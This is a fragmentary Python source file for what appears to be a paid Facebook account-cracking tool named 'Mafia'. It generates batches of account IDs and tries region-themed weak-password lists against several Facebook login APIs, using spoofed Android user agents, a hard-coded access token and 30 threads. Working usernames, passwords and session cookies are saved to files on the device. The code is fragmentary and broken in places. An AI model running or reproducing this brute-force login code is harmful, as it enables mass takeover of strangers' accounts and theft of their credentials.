...
Orignal code of Mafia
Github : 𝙈𝙍:𝙅𝙊𝙆𝙀𝙍-2004
...
try:
	...
	os.system('pip install requests bs4 futures==2 > /dev/ETISALAT')
...
\033[1;79m : :::     : :  :    :   :::  : :: ::    :   : :  \033[1;79m
\033[1;37m--------------------------------------------------
[~] Author   : 𝙈𝙍-𝙎𝙃𝘼𝙃𝙄-𝙅𝙊𝙆𝙀𝙍
[~] Facebook : 𝙎𝙃𝘼𝙃𝙄-𝙅𝙊𝙆𝙀𝙍
[~] Tool     : Paid  𝙡𝙤𝙫𝙚 𝙟𝙤𝙠𝙚𝙧 𝙝𝙖𝙘𝙠𝙚𝙧
[~] Version  : 30.0
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 88,80,86,87,84,83,82,89,81')
		print "
		print('\033[1;35m Code example: 01.02.03.04.05.06.07.08.09')
		...
		with tred(max_workers=30) as Mafia:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan1122','Muhammad Arman','khanbaba','افغانستان','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','khan1122','ali12345','افغانستان','khan12345','Muhammad Agha','Arman12345','khan','Mohammad','khan','pubg','pubg1122','malik786']
				elif pcs in ['3','03']:
					...
					passlist = [psx,ids,'khankhan','khan1122','786786','Agha786','khan123','khan12','افغانستان','ali123','khanbaba']
				elif pcs in ['7','07']:
					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				elif pcs in ['8','08']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Muhammad1122']
				if mthd in ['1','01']:
					Mafia.submit(Mafia1,ids,passlist)
				if mthd in ['2','02']:
					Mafia.submit(Mafia2,ids,passlist)
				if mthd in ['3','03']:
					Mafia.submit(Mafia3,ids,passlist)
				if mthd in ['4','04']:
					Mafia.submit(Mafia4,ids,passlist)
				if mthd in ['5','05']:
					Mafia.submit(Mafia5,ids,passlist)
				if mthd in ['6','06']:
					Mafia.submit(Mafia6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/ETISALAT;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        network = random.choice(['AWCC','ETISALAT','MTN','ETISALAT China'])
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;ETISALATFBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Mafia-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Mafia-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Mafia-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [Mafia-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Mafia-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Mafia-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Mafia-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			Mafia=session.cookies.get_dict().keys()
			if "c_user" in Mafia:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [Mafia-OK] %s | %s'%(ids,pas))
				open('/sdcard/Mafia-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Mafia:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [Mafia-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/Mafia-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Mafia-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Mafia-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [Mafia-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def Mafia2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Mafia-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/Mafia-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [Mafia-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/Mafia-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def Mafia3(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/Mafia-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Mafia-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def Mafia4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [Mafia-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [Mafia-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [Mafia-OK] '+uid+' | '+pas)
						open('/sdcard/Mafia-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [Mafia-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/Mafia-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
